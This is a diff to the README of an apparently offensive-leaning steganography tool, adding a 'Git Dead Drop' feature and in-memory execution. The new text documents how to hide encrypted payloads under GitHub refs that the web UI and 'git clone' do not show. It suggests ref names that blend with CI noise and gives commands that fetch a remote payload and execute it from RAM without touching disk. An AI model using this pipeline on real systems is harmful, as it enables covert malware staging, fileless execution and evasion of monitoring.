@@ -72,6 +72,27 @@ so CRC64(file) == beacon target       → nightmare decode → payload
 
 Any K of K+P carriers recover the original payload. The beacon enables stateless discovery across any directory without a manifest or filename list.
 
+### Git Dead Drop Pipeline
+
+```
+git-hide                                    git-reveal
+────────                                    ──────────
+payload                                     GitHub repo URL
+  │                                               │
+  ▼                                               ▼
+nightmare + Argon2id + ChaCha20         GET refs/nc/latest → commit SHA
+  │                                               │
+  ▼                                               ▼
+POST blob → tree → orphan commit          GET blob → ciphertext
+  → push refs/nc/latest (or custom ref)           │
+                                                  ▼
+                                          Argon2id + ChaCha20 decrypt
+                                          → nightmare decode → payload
+                                          [--exec: MemExec directly from RAM]
+```
+
+Payload is stored as an encrypted git blob object under a custom ref. The ref is invisible in GitHub's web UI, not fetched on `git clone`, and the blob content is opaque ciphertext.
+
 ---
 
 ## Security Model
@@ -116,6 +137,23 @@ All obfuscation and cryptographic operations run natively in Go. For core format
 - **JPEG:** Constructs a parallel APP1 segment with a valid TIFF/EXIF structure. The payload is stored in the UserComment (0x9286) tag with an undefined charset prefix, making it indistinguishable from camera-vendor encoded comments.
 - **MP3:** Injects a TXXX frame into the ID3v2 tag. Uses a **padding-first optimization** that overwrites existing ID3v2 padding to avoid shifting the audio stream, ensuring bit-perfect audio preservation. Verified by SHA256 comparison in the test suite.
 - **PDF:** Implements a **Native Purge Engine** that parses the full XREF chain and re-emits a clean single-pass PDF. Eliminates incremental update artifacts and ghost data traces common in PDF metadata editors. Falls back to exiftool for PDF 1.5+ compressed XREF streams and encrypted PDFs.
+
+### In-Memory Execution (Linux)
+
+`exec` and `git-reveal --exec` run the payload directly from RAM using `memfd_create` + `execveat(AT_EMPTY_PATH)`. The binary never touches disk. `execveat` with `AT_EMPTY_PATH` executes the file descriptor directly — no `/proc/self/fd/<n>` path string is opened or stored in memory. Supports amd64, arm64, arm32, and mips architectures.
+
+### Git Dead Drop
+
+`git-hide` / `git-reveal` / `git-wipe` use a GitHub repository as a covert carrier. The encrypted payload is stored as a git blob object under a custom ref (default: `refs/nc/latest`). Detection surface:
+
+| Surface | Visible? |
+|---|---|
+| GitHub web UI (branches, files, commits) | No |
+| `git clone` | No (not in default fetch refspec) |
+| `git log` | No |
+| `git ls-remote` | Ref name only — no content |
+
+The blob content is opaque v3 ciphertext. Even if retrieved, it is unreadable without the password.
 
 ### Surgical Wipe
 
@@ -189,6 +227,30 @@ nightcloak split secret.bin ./media/ -n 6 -k 4
 nightcloak gather ./media/ -o recovered.bin
 ```
 
+### Git Dead Drop
+
+```bash
+export NIGHTCLOAK_GIT_TOKEN=<github-pat>
+
+# Store encrypted payload in a GitHub repo
+nightcloak git-hide secret.bin https://github.com/owner/repo -p mypass
+
+# Custom ref (blends with CI/CD noise)
+nightcloak git-hide secret.bin https://github.com/owner/repo -p mypass -r refs/notes/ci
+
+# Retrieve and decrypt
+nightcloak git-reveal https://github.com/owner/repo -p mypass
+
+# Retrieve and execute directly from memory (Linux only)
+nightcloak git-reveal https://github.com/owner/repo -p mypass --exec
+
+# Wipe the ref from the remote
+nightcloak git-wipe https://github.com/owner/repo
+nightcloak git-wipe https://github.com/owner/repo -r refs/notes/ci
+```
+
+**Token scope required:** `repo` for private repos, `public_repo` for public repos. Fine-grained token: `Contents: Read and Write` on the specific repo only.
+
 ### Automation
 
 ```bash
@@ -208,6 +270,7 @@ KEY=- nightcloak hide photo.jpg payload.bin
 | `NIGHT_PASSWORD` | Primary password (same priority as `-p`) |
 | `KEY=<string>` | Secondary XChaCha20 key (raw string or Base58-decoded 32-byte key) |
 | `KEY=-` | Generate a random key, print Base58 to stderr |
+| `NIGHTCLOAK_GIT_TOKEN` | GitHub PAT for git-hide / git-reveal / git-wipe (same priority as `-t`) |
 
 ---
 
